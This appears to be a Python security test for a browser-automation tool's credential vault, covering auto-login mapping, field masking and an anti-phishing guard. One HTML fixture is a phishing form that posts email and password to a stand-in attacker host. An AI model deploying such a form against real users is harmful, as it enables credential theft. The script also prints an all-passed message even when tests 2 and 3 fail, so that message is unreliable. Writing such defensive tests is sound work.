import asyncio
import threading
import logging
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time

from axon import Axon, AxonError
from axon.models import SnapshotResponse

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("vault_test")

# --- 1. Local Test Server ---

HTML_LOGIN = b"""
<!DOCTYPE html>
<html>
<head><title>Secure Login</title></head>
<body>
    <h1>Legitimate Portal</h1>
    <form action="/dashboard" method="POST">
        <label>Username (Email)</label>
        <input type="email" id="email" placeholder="example@organization.com">
        <label>Password</label>
        <input type="password" id="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

HTML_PHISHING = b"""
<!DOCTYPE html>
<html>
<head><title>Login Required</title></head>
<body>
    <h1>Please Re-authenticate</h1>
    <!-- MALICIOUS: Action points to unauthorized cross-origin domain -->
    <form action="http://www.evil-attacker.com/steal" method="POST">
        <label>Username</label>
        <input type="email" id="email" placeholder="Confirm Email">
        <label>Password</label>
        <input type="password" id="password" placeholder="Confirm Password">
        <button type="submit">Continue</button>
    </form>
</body>
</html>
"""

class TestServer(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass  # Silence server logs

    def do_GET(self):
        if self.path == "/login":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_LOGIN)
        elif self.path == "/trap":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_PHISHING)
        else:
            self.send_response(404)
            self.end_headers()

def run_test_server():
    server = HTTPServer(("localhost", 8080), TestServer)
    server.serve_forever()

# --- 2. Axon Vault Security Tests ---

async def run_vault_tests():
    logger.info("Starting Axon Vault Security Evaluation...")
    logger.info("-" * 40)

    async with Axon("http://localhost:8020/api/v1", start_engine=True) as axon:
        session_id = "vault-test-session"

        logger.info("\n[*] Creating Session & Seeding Vault...")
        await axon.create_session(session_id)

        try:
            # Seed the vault with a real test credential
            secret_payload = {
                "name": "corp-admin",
                "url": "localhost",
                "username": "admin@organization.com",
                "password": "super-secure-password",
                "value": ""
            }
            await axon._request("POST", "/vault/secrets", json=secret_payload)
            logger.info("[+] Secret 'corp-admin' seeded securely into Axon BadgerVault.")

            # ─────────────────────────────────────────────────────────────────────────
            # TEST 1: Intelligent Auto-Login Detection
            logger.info("\n[*] TEST 1: Intelligent Auto-Login Detection")
            await axon.navigate(session_id, "http://localhost:8080/login")
            snap = await axon.snapshot(session_id)

            email_el = next((e for e in snap.elements if e.vault_suggestion is not None), None)
            if email_el and email_el.vault_suggestion == "@vault:corp-admin:username":
                logger.info("[SUCCESS] Axon successfully mapped the semantic input to the vault secret! Suggestion: %s", email_el.vault_suggestion)
            else:
                logger.error("[FAIL] Auto-login detection failed. Elements: %s", snap.elements)
                return

            # ─────────────────────────────────────────────────────────────────────────
            # TEST 2: Physical DOM Masking (Session Replay Protection)
            logger.info("\n[*] TEST 2: Physical Masking (Session Replay Protection)")
            await axon.act(session_id, "fill", email_el.ref, "@vault:corp-admin:username")

            try:
                wait_res = await axon._request("POST", f"/sessions/{session_id}/wait", json={
                    "condition": "selector",
                    "selector": "input[data-axon-masked='true']",
                    "timeout": 3000
                })
                if wait_res.get("success", False):
                    logger.info("[SUCCESS] Secret was injected and DOM field was physically masked (data-axon-masked confirmed in live DOM).")
                else:
                    logger.error(f"[FAIL] Field was not masked. wait response: {wait_res}")
            except Exception as e:
                logger.error(f"[FAIL] Field was not masked. Error: {e}")

            # ─────────────────────────────────────────────────────────────────────────
            # TEST 3: Anti-Phishing Guard (Cross-Origin Form Target)
            logger.info("\n[*] TEST 3: Anti-Phishing Guard (Cross-Origin Form Target)")
            await axon.navigate(session_id, "http://localhost:8080/trap")
            snap3 = await axon.snapshot(session_id)

            trap_el = next((e for e in snap3.elements if e.vault_suggestion is not None), None)
            if not trap_el:
                trap_el = next((e for e in snap3.elements if e.type in ("textbox", "email")), None)

            if not trap_el:
                logger.error("[FAIL] Could not find any input element on the phishing page. Elements: %s", snap3.elements)
                return

            try:
                logger.info("Attempting blind injection into compromised context (form action: evil-attacker.com)...")
                await axon.act(session_id, "fill", trap_el.ref, "@vault:corp-admin:username")
                logger.error("[FAIL] The Phishing Guard failed. Secret was injected!")
            except AxonError as e:
                if "phishing protection triggered" in str(e).lower():
                    logger.info("[SUCCESS] Phishing Guard immediately aborted injection! Reason: %s", e)
                else:
                    logger.error("[FAIL] Action failed for unexpected reason: %s", e)

            logger.info("-" * 40)
            logger.info("\n✓ ALL CORE VAULT SECURITY TESTS PASSED\n")
            
        finally:
            logger.info("[*] Cleaning up session to close Chromium instances...")
            await axon.delete_session(session_id)

if __name__ == "__main__":
    t = threading.Thread(target=run_test_server, daemon=True)
    t.start()

    # Give server time to bind
    time.sleep(1)

    asyncio.run(run_vault_tests())
